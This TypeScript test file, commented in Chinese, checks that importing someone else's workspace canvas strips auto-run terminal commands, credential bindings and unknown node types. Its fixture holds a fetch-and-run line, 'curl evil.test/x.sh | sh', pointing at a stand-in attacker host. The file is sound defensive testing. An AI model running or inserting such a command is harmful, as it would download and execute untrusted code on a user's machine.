/**
 * 外部工作区导入的净化。
 *
 * 钉的是一个**没标注的命令执行入口**：SavedNode 带 `command`，终端第一次起会话时
 * 会把它直接写进登录 shell。于是"打开别人发来的画布"= 重启后自动执行文件里的任意命令，
 * 而确认框只提了"替换画布 / 结束孤儿会话"，一个字没提执行。
 *
 * 这里逐条断言"摘掉了什么"，而不是只断言"函数跑通了" —— 净化最容易坏的方式是
 * 加了一层新结构（v3 的 boards 换个键名）而净化没跟上，那时函数照样返回一个对象。
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeImportedWorkspace } from '../src/main/workspace-import.ts'

const evil = (extra: Record<string, unknown> = {}): Record<string, unknown> => ({
  id: 't-evil',
  type: 'terminal',
  x: 0,
  y: 0,
  width: 400,
  height: 300,
  title: '看起来很正常',
  command: 'curl evil.test/x.sh | sh',
  identityId: 'i-victim',
  ...extra
})

test('v2：boards 里每块画布的启动命令都要摘掉', () => {
  const r = sanitizeImportedWorkspace({
    projects: [{ id: 'p1', cwd: '/tmp' }],
    boards: {
      p1: { nodes: [evil()], edges: [], viewport: { x: 0, y: 0, zoom: 1 } },
      p2: { nodes: [evil({ id: 't-evil2' })], edges: [] }
    }
  })
  const boards = r.ws.boards as Record<string, { nodes: Record<string, unknown>[] }>
  for (const pid of ['p1', 'p2']) {
    for (const n of boards[pid].nodes) {
      assert.equal(n.command, undefined, `${pid} 的节点还带着 command`)
      assert.equal(n.identityId, undefined, `${pid} 的节点还绑着本机凭证`)
    }
  }
  assert.equal(r.commands, 2)
  assert.equal(r.identities, 2)
})

test('v1：顶层 nodes 的老文件同样要净化', () => {
  const r = sanitizeImportedWorkspace({ nodes: [evil()], edges: [] })
  const nodes = r.ws.nodes as Record<string, unknown>[]
  assert.equal(nodes[0].command, undefined)
  assert.equal(r.commands, 1)
})

test('节点的其余字段原样保留（净化不是重写画布）', () => {
  const r = sanitizeImportedWorkspace({ nodes: [evil({ cwd: '/x', fontSize: 15 })] })
  const n = (r.ws.nodes as Record<string, unknown>[])[0]
  assert.equal(n.id, 't-evil')
  assert.equal(n.title, '看起来很正常')
  assert.equal(n.cwd, '/x')
  assert.equal(n.fontSize, 15)
})

test('类型不认识的节点整个丢掉（fromSaved 的兜底分支是 terminal）', () => {
  /* 这不是洁癖：fromSaved 对未知 type 会兜底成 terminal，
     于是"未来的新类型"在旧版本里会变成一个真的会 spawn 的终端。 */
  const r = sanitizeImportedWorkspace({
    nodes: [{ id: 'x1', type: 'wormhole' }, { id: 'x2', type: 'group' }, 'not-an-object']
  })
  const nodes = r.ws.nodes as Record<string, unknown>[]
  assert.deepEqual(
    nodes.map((n) => n.id),
    ['x2']
  )
  assert.equal(r.dropped, 2)
})

test('没有 type 的节点保留（v1 老文件里那就是终端）', () => {
  const r = sanitizeImportedWorkspace({ nodes: [{ id: 't9', title: '老终端' }] })
  assert.equal((r.ws.nodes as unknown[]).length, 1)
  assert.equal(r.dropped, 0)
})

test('不改入参 —— 调用方还拿着原对象', () => {
  const input = { nodes: [evil()] }
  sanitizeImportedWorkspace(input)
  assert.equal((input.nodes[0] as Record<string, unknown>).command, 'curl evil.test/x.sh | sh')
})

test('干净的文件不该报"摘掉了东西"（否则确认框天天喊狼来了）', () => {
  const r = sanitizeImportedWorkspace({
    nodes: [{ id: 't1', type: 'terminal', title: 'zsh', cwd: '/tmp' }]
  })
  assert.equal(r.commands, 0)
  assert.equal(r.identities, 0)
  assert.equal(r.dropped, 0)
})
